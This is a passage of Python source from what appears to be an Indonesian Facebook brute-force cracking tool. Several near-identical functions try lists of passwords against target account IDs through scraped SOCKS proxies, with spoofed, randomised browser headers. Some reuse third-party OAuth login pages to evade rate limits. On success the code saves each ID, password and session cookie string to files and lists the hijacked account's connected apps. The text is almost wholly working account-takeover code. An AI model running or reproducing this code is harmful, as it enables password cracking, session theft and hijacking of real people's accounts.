			'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=607187076044599&kid_directed_site=0&app_id=607187076044599&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fclient_id%3D607187076044599%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fpergikuliner.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6321ea45-1edf-459d-b7ba-f3006d4e5264%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpergikuliner.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': bahasa,
	        }
	    )
               po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
               if 'c_user' in ses.cookies.get_dict().keys():
                    ses = requests.Session()
                    headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
                    if 'ya' in taplikasi:
                         ok+=1
                         coki=po.cookies.get_dict()
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'\n')
                         tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oku = tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headapp,cookies=coki).text
                         soup = par(aktif, "html.parser")
                         ayu = tree.add(Panel.fit(f"[green] Aplikasi Aktive ",style=f"white"))
                         for ah in soup.find_all("h3"):
                              if "Ditambahkan" in ah.text:
                                   ayu.add(f"{puti}{str(ah.text).replace(f'Ditambahkan',f' {hijo}Ditambahkan')}{puti}")
                         oke = tree.add(Panel.fit(f"[green]{coki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headapp,cookies=coki).text
                         siu = par(inactiv, "html.parser")
                         he = tree.add(Panel.fit(f"[yellow] Aplikasi Expired ",style=f"white"))
                         for ina in siu.find_all("h3"):
                              if "Kedaluwarsa" in ina.text:
                                   he.add(f"{puti}{str(ina.text).replace('Kedaluwarsa',f' {kun}Kedaluwarsa')}{puti}")
                         link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headapp,cookies=coki).text
                         html = par(link1, "html.parser")
                         he = tree.add(Panel.fit(f"[red] Aplikasi Deleted ",style=f"white"))
                         for i in html.find_all("h3"):
                              if "Dihapus" in i.text:
                                   he.add(f"{puti}{str(i.text).replace('Dihapus',f' {mer}Dihapus')}{puti}")
                         prints(tree)
                         break
                         
                    elif 'no' in taplikasi:
                         ok+=1
                         coki = ses.cookies.get_dict()
                         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                         oke = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oke.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         oke.add(Panel.fit(f"[green]{kuki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         prints(oke)
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                         break
                    
               elif "checkpoint" in po.cookies.get_dict().keys():
                    cpe = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow]{tahun(idf)} ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
                    prints(cpe)
                    open('/sdcard/MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akune.append(idf+'|'+pw)
                    ceker(idf,pw)
                    cp+=1
                    break
                    
               else:continue
          except requests.exceptions.ConnectionError:
               time.sleep(31)
     loop+=1
 
###----------[ MBF-02 ]----------###       				    
def crack2(idf,pwx):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
     emot = rc(["😝","😜","🤪"])
     prog.update(des,description=f"\r[white] {emot} ( MBF 02 ) ( OK [green]: {ok} [white]) ( CP [yellow]: {cp} [white]) ([red] {loop}/{len(id)} [white]) ")
     prog.advance(des)
     for pw in pwx:
          try:
               proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
               open('socksku.txt','w').write(proxs)
               nip = rc(proxs)
               proxs = {'http': 'socks4://'+nip}
               ua = Saran(glento=1)
               ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
               link = ses.get('https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr')
               date = {
		"lsd":
		    re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
		"jazoest":
		       re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
		       "uid":idf,
		       "next":"https://m.facebook.com/",
		       "flow":"login_no_pin",
		       "pass":pw,
	        }
               cokz = ";".join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items()])		
               bahasa = rc(['en-US;q=0.8,en;q=0.7','en-GB;q=0.8,en;q=0.7','zh-CN;q=0.8,zh;q=0.7','ms_MY;q=0.8,ms;q=0.7','fr_FR;q=0.8,fr;q=0.7','id-ID;q=0.8,id;q=0.7','jv-ID;q=0.8,id;q=0.7'])
               head = (
			{
			'Host': 'm.facebook.com',
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,5))}',
			'viewport-width': f'{str(rr(400,999))}',
			'sec-ch-ua': f'"Not?A_Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(108,114))}", "Google Chrome";v="{str(rr(108,114))}"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
			'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'x-requested-with': 'com.facebook.katana',
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': bahasa,
	        }
	    )
               po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
               if 'c_user' in ses.cookies.get_dict().keys():
                    ses = requests.Session()
                    headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
                    if 'ya' in taplikasi:
                         ok+=1
                         coki=po.cookies.get_dict()
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'\n')
                         tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oku = tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headapp,cookies=coki).text
                         soup = par(aktif, "html.parser")
                         ayu = tree.add(Panel.fit(f"[green] Aplikasi Aktive ",style=f"white"))
                         for ah in soup.find_all("h3"):
                              if "Ditambahkan" in ah.text:
                                   ayu.add(f"{puti}{str(ah.text).replace(f'Ditambahkan',f' {hijo}Ditambahkan')}{puti}")
                         oke = tree.add(Panel.fit(f"[green]{coki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headapp,cookies=coki).text
                         siu = par(inactiv, "html.parser")
                         he = tree.add(Panel.fit(f"[yellow] Aplikasi Expired ",style=f"white"))
                         for ina in siu.find_all("h3"):
                              if "Kedaluwarsa" in ina.text:
                                   he.add(f"{puti}{str(ina.text).replace('Kedaluwarsa',f' {kun}Kedaluwarsa')}{puti}")
                         link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headapp,cookies=coki).text
                         html = par(link1, "html.parser")
                         he = tree.add(Panel.fit(f"[red] Aplikasi Deleted ",style=f"white"))
                         for i in html.find_all("h3"):
                              if "Dihapus" in i.text:
                                   he.add(f"{puti}{str(i.text).replace('Dihapus',f' {mer}Dihapus')}{puti}")
                         prints(tree)
                         break
                         
                    elif 'no' in taplikasi:
                         ok+=1
                         coki = ses.cookies.get_dict()
                         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                         oke = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oke.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         oke.add(Panel.fit(f"[green]{kuki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         prints(oke)
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                         break
                    
               elif "checkpoint" in po.cookies.get_dict().keys():
                    cpe = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow]{tahun(idf)} ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
                    prints(cpe)
                    open('/sdcard/MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akune.append(idf+'|'+pw)
                    ceker(idf,pw)
                    cp+=1
                    break
                    
               else:continue
          except requests.exceptions.ConnectionError:
               time.sleep(31)
     loop+=1
     
###----------[ MBF-03 ]----------###       				    
def crack3(idf,pwx):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
     emot = rc(["😝","😜","🤪"])
     prog.update(des,description=f"\r[white] {emot} ( MBF 03 ) ( OK [green]: {ok} [white]) ( CP [yellow]: {cp} [white]) ([red] {loop}/{len(id)} [white]) ")
     prog.advance(des)
     for pw in pwx:
          try:
               proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
               open('socksku.txt','w').write(proxs)
               nip = rc(proxs)
               proxs = {'http': 'socks4://'+nip}
               ua = Saran(glento=1)
               ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
               link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=344190606773871&kid_directed_site=0&app_id=344190606773871&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fclient_id%3D344190606773871%26redirect_uri%3Dhttps%253A%252F%252Fauthenticate.riotgames.com%252Fredirects%252Ffacebook%26state%3D1a67cc732815d893f87d8053f9c057e1e5166755cfe16445766f40d31c0e%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df815ea0d-433c-4a0b-a325-cdfd822fae0d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1a67cc732815d893f87d8053f9c057e1e5166755cfe16445766f40d31c0e%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
               date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
               cokz = ";".join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items()])		
               bahasa = rc(['en-US;q=0.8,en;q=0.7','en-GB;q=0.8,en;q=0.7','zh-CN;q=0.8,zh;q=0.7','ms_MY;q=0.8,ms;q=0.7','fr_FR;q=0.8,fr;q=0.7','id-ID;q=0.8,id;q=0.7','jv-ID;q=0.8,id;q=0.7'])
               head = {"Host": "m.facebook.com",
			"content-length": f"{len(str(date))}",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "mark.via.gp",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://m.facebook.com",
			"sec-fetch-site": "none",
			"sec-fetch-mode": "navigate",
			"sec-fetch-dest": "document",
			"referer": "https://free.facebook.com/v13.0/dialog/oauth?client_id=344190606773871&redirect_uri=https%3A%2F%2Fauthenticate.riotgames.com%2Fredirects%2Ffacebook&state=cf6e9bb52dc57f69601e1f951fbfa5fa198fd9843a5250e744c7ec218d73&scope=email&ret=login&fbapp_pres=0&logger_id=a55bca6c-4160-473d-bebc-4b9ca91b72b4&tp=unspecified",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": bahasa,
			"x-response-format": "JSONStream"}	
               po = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
               if 'c_user' in ses.cookies.get_dict().keys():
                    ses = requests.Session()
                    headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
                    if 'ya' in taplikasi:
                         ok+=1
                         coki=po.cookies.get_dict()
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'\n')
                         tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oku = tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headapp,cookies=coki).text
                         soup = par(aktif, "html.parser")
                         ayu = tree.add(Panel.fit(f"[green] Aplikasi Aktive ",style=f"white"))
                         for ah in soup.find_all("h3"):
                              if "Ditambahkan" in ah.text:
                                   ayu.add(f"{puti}{str(ah.text).replace(f'Ditambahkan',f' {hijo}Ditambahkan')}{puti}")
                         oke = tree.add(Panel.fit(f"[green]{coki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headapp,cookies=coki).text
                         siu = par(inactiv, "html.parser")
                         he = tree.add(Panel.fit(f"[yellow] Aplikasi Expired ",style=f"white"))
                         for ina in siu.find_all("h3"):
                              if "Kedaluwarsa" in ina.text:
                                   he.add(f"{puti}{str(ina.text).replace('Kedaluwarsa',f' {kun}Kedaluwarsa')}{puti}")
                         link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headapp,cookies=coki).text
                         html = par(link1, "html.parser")
                         he = tree.add(Panel.fit(f"[red] Aplikasi Deleted ",style=f"white"))
                         for i in html.find_all("h3"):
                              if "Dihapus" in i.text:
                                   he.add(f"{puti}{str(i.text).replace('Dihapus',f' {mer}Dihapus')}{puti}")
                         prints(tree)
                         break
                         
                    elif 'no' in taplikasi:
                         ok+=1
                         coki = ses.cookies.get_dict()
                         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                         oke = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oke.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         oke.add(Panel.fit(f"[green]{kuki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         prints(oke)
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                         break
                    
               elif "checkpoint" in po.cookies.get_dict().keys():
                    cpe = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow]{tahun(idf)} ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
                    prints(cpe)
                    open('/sdcard/MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akune.append(idf+'|'+pw)
                    ceker(idf,pw)
                    cp+=1
                    break
                    
               else:continue
          except requests.exceptions.ConnectionError:
               time.sleep(31)
     loop+=1
 
###----------[ MBF-04 ]----------###       				    
def crack4(idf,pwx):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
     emot = rc(["😝","😜","🤪"])
     prog.update(des,description=f"\r[white] {emot} ( MBF 04 ) ( OK [green]: {ok} [white]) ( CP [yellow]: {cp} [white]) ([red] {loop}/{len(id)} [white]) ")
     prog.advance(des)
     for pw in pwx:
          try:
               proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
               open('socksku.txt','w').write(proxs)
               nip = rc(proxs)
               proxs = {'http': 'socks5://'+nip}
               ua = Saran(glento=1)
               ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
               link = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fclient_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Dpublic_profile%252C%2Bemail%26state%3D51ef1254f0cd1f1bfc616d837984a9710af4f0b2f1036ac0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1a6e89e0-aa8e-44c6-94a8-64fac35ccaec%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D51ef1254f0cd1f1bfc616d837984a9710af4f0b2f1036ac0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
               date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
               cokz = ";".join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items()])		
               bahasa = rc(['en-US;q=0.8,en;q=0.7','en-GB;q=0.8,en;q=0.7','zh-CN;q=0.8,zh;q=0.7','ms_MY;q=0.8,ms;q=0.7','fr_FR;q=0.8,fr;q=0.7','id-ID;q=0.8,id;q=0.7','jv-ID;q=0.8,id;q=0.7'])
               head = {"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(date))}",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "mark.via.gp",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://m.alpha.facebook.com",
			"sec-fetch-site": "none",
			"sec-fetch-mode": "navigate",
			"sec-fetch-dest": "document",
			"referer": "https://free.facebook.com/v4.0/dialog/oauth?response_type=code&client_id=923560728108869&redirect_uri=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback&state=796d0cb30a47b485779b044fe00412aaf7a6176bdaa6da23&scope=public_profile%2C+email&ret=login&fbapp_pres=0&logger_id=316f61e8-edf0-4bff-9e1b-db57cccc4337&tp=unspecified",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": bahasa,
			"x-response-format": "JSONStream"}	
               po = ses.post("https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
               if 'c_user' in ses.cookies.get_dict().keys():
                    ses = requests.Session()
                    headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
                    if 'ya' in taplikasi:
                         ok+=1
                         coki=po.cookies.get_dict()
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'\n')
                         tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oku = tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headapp,cookies=coki).text
                         soup = par(aktif, "html.parser")
                         ayu = tree.add(Panel.fit(f"[green] Aplikasi Aktive ",style=f"white"))
                         for ah in soup.find_all("h3"):
                              if "Ditambahkan" in ah.text:
                                   ayu.add(f"{puti}{str(ah.text).replace(f'Ditambahkan',f' {hijo}Ditambahkan')}{puti}")
                         oke = tree.add(Panel.fit(f"[green]{coki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headapp,cookies=coki).text
                         siu = par(inactiv, "html.parser")
                         he = tree.add(Panel.fit(f"[yellow] Aplikasi Expired ",style=f"white"))
                         for ina in siu.find_all("h3"):
                              if "Kedaluwarsa" in ina.text:
                                   he.add(f"{puti}{str(ina.text).replace('Kedaluwarsa',f' {kun}Kedaluwarsa')}{puti}")
                         link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headapp,cookies=coki).text
                         html = par(link1, "html.parser")
                         he = tree.add(Panel.fit(f"[red] Aplikasi Deleted ",style=f"white"))
                         for i in html.find_all("h3"):
                              if "Dihapus" in i.text:
                                   he.add(f"{puti}{str(i.text).replace('Dihapus',f' {mer}Dihapus')}{puti}")
                         prints(tree)
                         break
                         
                    elif 'no' in taplikasi:
                         ok+=1
                         coki = ses.cookies.get_dict()
                         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                         oke = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oke.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         oke.add(Panel.fit(f"[green]{kuki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         prints(oke)
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                         break
                    
               elif "checkpoint" in po.cookies.get_dict().keys():
                    cpe = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow]{tahun(idf)} ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
                    prints(cpe)
                    open('/sdcard/MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akune.append(idf+'|'+pw)
                    ceker(idf,pw)
                    cp+=1
                    break
                    
               else:continue
          except requests.exceptions.ConnectionError:
               time.sleep(31)
     loop+=1
     
###----------[ MBF-05 ]----------###       				    
def crack5(idf,pwx):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
     emot = rc(["😝","😜","🤪"])
     prog.update(des,description=f"\r[white] {emot} ( MBF 05 ) ( OK [green]: {ok} [white]) ( CP [yellow]: {cp} [white]) ([red] {loop}/{len(id)} [white]) ")
     prog.advance(des)
     for pw in pwx:
